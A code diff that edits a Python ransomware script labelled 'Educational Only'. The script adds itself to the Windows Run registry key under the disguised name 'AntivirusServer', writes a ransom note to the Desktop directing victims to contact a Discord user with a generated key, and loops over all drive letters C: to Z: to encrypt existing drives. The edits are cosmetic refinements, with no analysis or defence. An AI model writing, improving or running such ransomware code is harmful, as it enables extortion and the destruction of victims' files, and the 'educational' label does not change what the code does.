@@ -1,3 +1,8 @@
+#!/usr/bin/python3
+"""
+Ransomware Demo - Educational Only
+"""
+
 import os
 import sys
 import time
@@ -12,7 +17,7 @@ def add_to_startup():
     sub_key = r"Software\Microsoft\Windows\CurrentVersion\Run"
     try:
         registry_key = winreg.OpenKey(key, sub_key, 0, winreg.KEY_WRITE)
-        winreg.SetValueEx(registry_key, "defenderguard", 0, winreg.REG_SZ, sys.executable)
+        winreg.SetValueEx(registry_key, "AntivirusServer", 0, winreg.REG_SZ, sys.executable)
         winreg.CloseKey(registry_key)
     except WindowsError as e:
         print(f"Error adding to startup: {e}")
@@ -47,22 +52,21 @@ def main():
     add_to_startup()
     
     # Create ransom note
-    ransom_text = f"""
+    ransom_text = """
 YOUR FILES HAVE BEEN ENCRYPTED
 
 To decrypt your files, do this:
-Download Discord or use the web version on https://discord.com/app on your phone or another device since we encrypted browsers.
-Friend this user: colabvm
-Ask us to decrypt it along with the ID.
-Your unique ID: {key}
-
+Download Discord or open the web version https://discord.com/app
+Add "colabvm" as a friend
+Tell him the key and do what he says to decrypt it.
+Your unique key: {key}
 """
     key = ''.join(random.choices(string.ascii_letters + string.digits, k=16))
     ransom_path = os.path.join(os.path.expanduser('~'), 'Desktop', 'READ_ME.html')
     with open(ransom_path, 'w', encoding='utf-8') as f:
         f.write(ransom_text.format(key=key))
     
-    # Encrypt all drives
+    # Encrypt all existing drives
     drives = ['C:', 'D:', 'E:', 'F:', 'G:', 'H:', 'I:', 'J:', 'K:', 'L:', 'M:', 'N:', 'O:', 'P:', 'Q:', 'R:', 'S:', 'T:', 'U:', 'V:', 'W:', 'X:', 'Y:', 'Z:']
     for drive in drives:
         if os.path.exists(drive):
